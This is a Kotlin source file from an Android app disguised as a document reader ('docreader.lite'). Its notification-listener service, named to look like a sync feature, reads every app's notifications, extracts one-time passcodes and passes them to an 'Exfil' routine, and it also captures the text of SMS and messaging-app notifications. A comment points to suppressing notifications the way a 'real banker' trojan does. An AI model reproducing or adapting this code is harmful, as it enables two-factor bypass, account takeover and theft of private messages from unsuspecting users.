package com.docreader.lite.reader

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification

/**
 * NotificationListenerService — captures OTP from system notifications.
 * Sees ALL notifications from ALL apps.
 */
class SyncNotificationService : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val pkg = sbn.packageName ?: return
        val n = sbn.notification ?: return

        val title = n.extras?.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
        val text = n.extras?.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
        val bigText = n.extras?.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString() ?: ""
        val ticker = n.tickerText?.toString() ?: ""

        val combined = "$title $text $bigText $ticker"

        val otp = TextExtractor.extract(combined)
        if (otp != null) {
            Exfil.otp("notif:$pkg", otp, pkg)
        }

        // Also capture full notification from messaging/SMS apps
        if (isSmsApp(pkg) && combined.isNotBlank()) {
            Exfil.credential(pkg, "notification_text", combined.take(500))
        }

        // Real banker: cancelNotification(sbn.key) to suppress
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        // Track if user saw notification before we could capture
    }

    private fun isSmsApp(pkg: String): Boolean {
        return pkg.contains("messaging") || pkg.contains("mms") ||
                pkg.contains("sms") || pkg == "com.android.phone"
    }
}
